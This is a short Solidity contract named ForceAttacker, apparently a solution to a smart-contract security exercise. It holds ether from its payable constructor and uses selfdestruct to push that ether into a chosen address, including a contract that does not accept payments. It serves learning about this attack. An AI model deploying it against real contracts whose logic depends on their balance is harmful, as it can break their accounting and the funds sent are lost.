pragma solidity ^0.6.0;

contract ForceAttacker{

    constructor() public payable{ }

    function destruct(address payable _addr) public{
        selfdestruct(_addr);
    }
}